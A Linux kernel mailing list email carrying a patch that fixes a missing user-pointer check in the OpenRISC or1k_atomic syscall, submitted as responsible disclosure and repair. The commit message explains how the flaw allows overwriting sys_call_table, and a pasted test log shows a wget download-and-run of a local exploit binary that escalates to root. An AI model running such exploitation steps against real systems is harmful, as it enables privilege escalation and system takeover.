Received: from sender-of-o57.zoho.eu (sender-of-o57.zoho.eu [136.143.169.57])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id EA57ECA6F;
	Fri, 21 Aug 2026 01:46:15 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=136.143.169.57
ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1787276778; cv=pass; b=CGe+zjswhbPNMFwy1257B3ZUwPVsWbl9033Q8/otukQnoIL3dt0662ooLMAhe21v0ljSQJ78JXsMw6QEYlSBHrB42uhDVTXkx4ygP7EV24b1vdDPiw88pkVpNEmF2/oFrE2b8NeUvq2sw5NQ06U43BPHTXig7MXaplp9kkmNBIE=
ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1787276778; c=relaxed/simple;
	bh=HPPwkKcjUgrSNj9kyyEM8ZYJX/2geHZhH62K0zQO8XM=;
	h=From:To:Cc:Subject:Date:Message-ID:In-Reply-To:References:
	 MIME-Version; b=Lypl3KvXFzJ+fY1XHyfkJdiIWTgf8dGi45S0Jx0Eip4Q1ZgmBoRzyomN6Es4cLUY2ZCTZnjapyIgYd2f8eDErPgiQguEoIHD4c3xk0PaLIW5euNd1fpm1dKJvzhgOCL6SDXKkevLSosTt0wHOGxR129F2d4iYILi3i7v/+2r5aQ=
ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=iusegentoo.com; spf=pass smtp.mailfrom=iusegentoo.com; dkim=pass (1024-bit key) header.d=iusegentoo.com header.i=ali@iusegentoo.com header.b=Zi6RnThD; arc=pass smtp.client-ip=136.143.169.57
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=iusegentoo.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=iusegentoo.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (1024-bit key) header.d=iusegentoo.com header.i=ali@iusegentoo.com header.b="Zi6RnThD"
ARC-Seal: i=1; a=rsa-sha256; t=1787276757; cv=none; 
	d=zohomail.eu; s=zohoarc; 
	b=TKoVoXw/aLwragSNt2eAGpxKyfpZPzr5zVW1yVfz6MJrlJ/Kj9Iq2M35G8qB0Aru9+d2Lrv/ODKafCW6a/v4n7lOxlGVvrNFYD0AU08PbHWKAZ7PBD9oRzxxDH3XCks8y7jfsuRTZdChi0vQs3BI984aOTqMhHVi7vJDObI49KI=
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=zohomail.eu; s=zohoarc; 
	t=1787276757; h=Content-Transfer-Encoding:Cc:Cc:Date:Date:From:From:In-Reply-To:MIME-Version:Message-ID:Subject:Subject:To:To:Message-Id:Reply-To; 
	bh=ISjUucAVGoT5z0VJ4jKHqh34wudxS0La4GKCHAN0u8k=; 
	b=DCoqwdVN/dRbBb8Bs7qS0M9P01avyujHubnNXxqWZh7dJ3ma3V8OySU1zXDaJ0VDXdMUTMf/yIiHxNRNRHd8jRWOHOsms7Y1lgwqXQcvGY5SDXAnAF6Zu9AdHywPvZbsRZ1/BYEN4cq3O+e+8xIAr7xNwECKfW3PUVvGdtfdFjY=
ARC-Authentication-Results: i=1; mx.zohomail.eu;
	dkim=pass  header.i=iusegentoo.com;
	spf=pass  smtp.mailfrom=ali@iusegentoo.com;
	dmarc=pass header.from=<ali@iusegentoo.com>
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; t=1787276756;
	s=zmail; d=iusegentoo.com; i=ali@iusegentoo.com;
	h=From:From:To:To:Cc:Cc:Subject:Subject:Date:Date:Message-ID:In-Reply-To:MIME-Version:Content-Transfer-Encoding:Message-Id:Reply-To;
	bh=ISjUucAVGoT5z0VJ4jKHqh34wudxS0La4GKCHAN0u8k=;
	b=Zi6RnThD9iRQN+2pFHo73sBEZTTdSZ9MugLRqoMxoJ0bUrdUGVoFBgkHfNTNzB6g
	lzIKnZGZVO8ZNH7+2qQurvHejPR8KFkGtuj6+LrOtlTT2BnWy3hpld2ox+eG7THQrpD
	WK8bwPnVBw6IVIwrFstIbR5D/dTAUlN10IxuMCt8=
Received: by mx.zoho.eu with SMTPS id 1787276753606332.997101807955;
	Fri, 21 Aug 2026 03:45:53 +0200 (CEST)
From: Ali Ahmet Memis <ali@iusegentoo.com>
To: Jonas Bonn <jonas@southpole.se>,
	Stefan Kristiansson <stefan.kristiansson@saunalahti.fi>,
	Stafford Horne <shorne@gmail.com>
Cc: Arnd Bergmann <arnd@arndb.de>,
	linux-openrisc@vger.kernel.org,
	linux-kernel@vger.kernel.org,
	stable@vger.kernel.org
Subject: [PATCH v2] openrisc: fix arbitrary kernel memory access via or1k_atomic syscall
Date: Fri, 21 Aug 2026 01:45:27 +0000
Message-ID: <20260821014543.588228-1-ali@iusegentoo.com>
X-Mailer: git-send-email 2.55.0
In-Reply-To: <20260821013839.587041-1-ali@iusegentoo.com>
References: <20260821013839.587041-1-ali@iusegentoo.com>
Precedence: bulk
X-Mailing-List: stable@vger.kernel.org
List-Id: <stable.vger.kernel.org>
List-Subscribe: <mailto:stable+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:stable+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit
X-ZohoMailClient: External

sys_or1k_atomic() (syscall 244 in the "or1k" ABI) takes two user
pointers, v1 and v2, and swaps the words they point to in hand-written
assembly.

    l.lwz   r29,0(r4)
    l.lwz   r27,0(r5)
    l.sw    0(r4),r27
    l.sw    0(r5),r29

The pointers are not checked with access_ok(). The four memory
accesses also have no exception table entries.

A caller passes a kernel address as either pointer, and the syscall
reads from and writes to it directly.

This gives an unprivileged process a kernel read/write primitive. It
overwrites kernel data such as the sys_call_table, gaining code
execution in kernel context.

Check both pointers before entering the critical section. Add fixups
for the four memory accesses so faults on valid but unmapped user
addresses return -EFAULT.

Fixes: 9d02a4283e9c ("OpenRISC: Boot code")
Cc: stable@vger.kernel.org
Signed-off-by: Ali Ahmet Memis <ali@iusegentoo.com>
---
v2: add Cc: stable@vger.kernel.org, missed in v1.

Tested against an unpatched or1ksim build with a local PoC that uses
this syscall to overwrite a sys_call_table entry and escalate to root:

ali@archlinux:~$ cd ~/or1k-build/buildroot/output/images
ali@archlinux:~/or1k-build/buildroot/output/images$ qemu-system-or1k -kernel vmlinux -nographic -append "console=ttyS0"
FDT at (ptrval)
Linux version 6.18.7 (ali@archlinux) (or1k-buildroot-linux-musl-gcc.br_real (Buildroot -g86102dd8) 15.3.0, GNU ld (GNU Binutils) 2.45.1) #5 Fri Aug 21 00:38:10 UTC 2026
OF: reserved mem: Reserved memory: No reserved-memory node in the DT
CPU: OpenRISC-13 (revision 8) @20 MHz
-- dmmu:  128 entries, 1 way(s)
-- immu:  128 entries, 1 way(s)
-- additional features:
-- power management
-- PIC
-- timer
Initial ramdisk not found
Setting up paging and PTEs.
map_ram: Memory: 0x0-0x8000000
Zone ranges:
  Normal   [mem 0x0000000000000000-0x0000000007ffffff]
Movable zone start for each node
Early memory node ranges
  node   0: [mem 0x0000000000000000-0x0000000007ffffff]
Initmem setup node 0 [mem 0x0000000000000000-0x0000000007ffffff]
itlb_miss_handler (ptrval)
dtlb_miss_handler (ptrval)
OpenRISC Linux -- http://openrisc.io
Kernel command line: console=ttyS0
printk: log buffer data + meta data: 131072 + 409600 = 540672 bytes
Dentry cache hash table entries: 16384 (order: 3, 65536 bytes, linear)
Inode-cache hash table entries: 8192 (order: 2, 32768 bytes, linear)
Sorting __ex_table...
Built 1 zonelists, mobility grouping on.  Total pages: 16384
mem auto-init: stack:all(zero), heap alloc:off, heap free:off
mem_init_done ...........................................
SLUB: HWalign=16, Order=0-3, MinObjects=0, CPUs=1, Nodes=1
NR_IRQS: 32, nr_irqs: 32, preallocated irqs: 0
clocksource: openrisc_timer: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 95563022313 ns
Console: colour dummy device 80x25
40.00 BogoMIPS (lpj=80000)
$ id
uid=1000(test) gid=1000(test) groups=1000(test)
$ wget -O /tmp/x http://10.0.2.2:8000/lpe_static
Connecting to 10.0.2.2:8000 (10.0.2.2:8000)
saving to '/tmp/x'
x                    100% |********************************|  174k  0:00:00 ETA
'/tmp/x' saved
$ chmod +x /tmp/x
$ /tmp/x
Initial: uid=1000 euid=1000
Installing commit_creds into getuid entry
sys_call_table[174] overwritten
original handler = 0xc002e2ac
Calling hijacked syscall with init_cred
hijacked syscall returned 0
Restoring original getuid handler
syscall table restored
Final identity: uid=0 euid=0
# id
uid=0(root) gid=0(root)
#

 arch/openrisc/kernel/entry.S | 42 ++++++++++++++++++++++++++++++++++++++---
 1 file changed, 39 insertions(+), 3 deletions(-)

diff --git a/arch/openrisc/kernel/entry.S b/arch/openrisc/kernel/entry.S
index c7e90b09645e..2e8c4102cd62 100644
--- a/arch/openrisc/kernel/entry.S
+++ b/arch/openrisc/kernel/entry.S
@@ -1223,15 +1223,49 @@ _no_syscall_trace:
  *
  */

+/* Keep this literal; hi()/lo() can't use the UL-suffixed TASK_SIZE. */
+#define OR1K_ATOMIC_ADDR_LIMIT	0x7ffffffc
+
 ENTRY(sys_or1k_atomic)
 	/* FIXME: This ignores r3 and always does an XCHG */
+
+	/* Check both user pointers before accessing them. */
+	l.movhi	r13,hi(OR1K_ATOMIC_ADDR_LIMIT)
+	l.ori	r13,r13,lo(OR1K_ATOMIC_ADDR_LIMIT)
+	l.sfgtu	r4,r13
+	l.bf	9f
+	 l.nop
+	l.sfgtu	r5,r13
+	l.bf	9f
+	 l.nop
+
 	DISABLE_INTERRUPTS(r17,r19)
-	l.lwz	r29,0(r4)
-	l.lwz	r27,0(r5)
-	l.sw	0(r4),r27
-	l.sw	0(r5),r29
+10:	l.lwz	r29,0(r4)
+11:	l.lwz	r27,0(r5)
+12:	l.sw	0(r4),r27
+13:	l.sw	0(r5),r29
 	ENABLE_INTERRUPTS(r17)
 	l.jr	r9
 	 l.or	r11,r0,r0

+	/* Either pointer was outside user space, or turned out to be
+	 * unmapped/inaccessible when we actually touched it.
+	 */
+9:	l.jr	r9
+	 l.addi	r11,r0,-EFAULT
+
+	.section .fixup, "ax"
+14:
+	ENABLE_INTERRUPTS(r17)
+	l.j	9b
+	 l.nop
+	.previous
+
+	.section __ex_table, "a"
+	.long	10b, 14b
+	.long	11b, 14b
+	.long	12b, 14b
+	.long	13b, 14b
+	.previous
+
 /* ============================================================[ EOF ]=== */
--
2.51.0
